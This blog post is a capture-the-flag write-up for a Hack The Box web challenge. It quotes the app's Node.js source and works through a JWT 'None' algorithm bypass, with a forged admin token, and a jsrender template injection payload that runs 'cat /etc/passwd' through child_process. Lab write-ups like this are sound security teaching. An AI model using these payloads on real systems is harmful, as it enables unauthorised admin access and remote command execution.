---
layout: post
title: "[HTB] Didactic Octo Paddles"
slug: "didactic"
date: "2023-03-23"
comments: false
categories:
  - hacking
tags:
  - ctf
  - write up
  - hack the box
  - cyber apocalypse
  - SSTI
  - JWT attack
---

This year I participated in Cyber Apocalypse, a CTF organised by hackthebox and managed to solve a few web challenges. Here is my writeup for didactic octo paddles, a medium difficulty web challenge. In this challenge, we are given the luxury of going through the source code of the web application, so it becomes easier to find vulnerabilities in logic errors. Looking at the source code, the web app is written in ```javascript``` and utilise ```nodejs``` in the backend. 

Navigating to the ip address of the challenge web server we are greeted with a login page, but there is no sight of any other button to click or navigate to. 

![img](/images/didactic/pic1.png)

Since we have access to the source code, we can see all the routes available in the application and it can be seen that there is a ```register``` route present in the web app. The ```json``` data sent during registering and login is similar with just ```username``` and ```password``` sent in the ```json```.
So we can easily capture the login request in a proxy like ```burp``` and send the data to the ```/register``` route and create an account for use.

```javascript
 router.get("/register", async (req, res) => {
        res.render("register");
    });

    router.post("/register", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            const existingUser = await db.Users.findOne({
                where: { username: username },
            });
            if (existingUser) {
                return res
                    .status(400)
                    .send(response("Username already exists"));
            }

            await db.Users.create({
                username: username,
                password: bcrypt.hashSync(password),
            }).then(() => {
                res.send(response("User registered succesfully"));
            });
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });
```

![img](/images/didactic/pic2.png)

Now let us login with the user account we have created.
Username: ```test``` Password: ```test```.  We are greeted with a page that contains a bunch of paddles which can be added to cart. 
We could spend time and explore all the functionalities of the web app, but since we have access to the source code, we can save a lot of time and not get stuck in any rabbit hole. Observing the code we can see that there is a middleware that handles ```auth``` and ```admin```. Taking a look at the snippet of code in the ```admin``` middleware.

![img](/images/didactic/pic3.png)

```javascript
const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};
```

We can see that the webapp uses ```JWT``` for authentication and it uses ```HS256``` algorithm for encrypting the ```payload```. 
We can also observe that there is a conditional that handles ```none``` in the ```JWT``` header but it does not account for other text like ```None```, ```NONE``` so we can easily bypass this and perform a JWT header attack and change the payload.

![img](/images/didactic/pic4.png)


My current session ```JWT``` has ```id=2``` so ```admin``` user must have ```id=1```. Modifying the ```JWT``` header to ```None``` and payload with ```id=1```. We now have access to admin session.

This is the new ```JWT``` token with admin session: ```eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5Njg5NTkyLCJleHAiOjE2Nzk2OTMxOTJ9.```
Site use for generating the token [JWT](https://www.gavinjl.me/edit-jwt-online-alg-none/)
  
![img](/images/didactic/pic5.png)

Now that we have admin dashboard we have a list of users that are registered in the web app. Now lets us find our next vulnerability in the web app through the source code.

```javascript
router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```
We can see that the username is used directly without any sanitisation or check and rendered in the admin dashboard. 
And here is the ```admin.jsrender``` template. 

```javascript
<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
    </ul>
  </div>
</body>
```

So our vulnerability is probably server side template injection. 
Let us use our trusty google to find a valid ssti for this webapp and its templating engine jsrender.

- [jsrender](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

- [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

According to hacktricks we can use the payload ```{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}``` to invoke a ssti and cat ```/etc/passwd```.

So let's register a user with the payload and see what happens.

![img](/images/didactic/pic6.png)

![img](/images/didactic/pic7.png)

> We are in! We can modify the payload to do anything we want. cat ../flag.txt to get the flag.





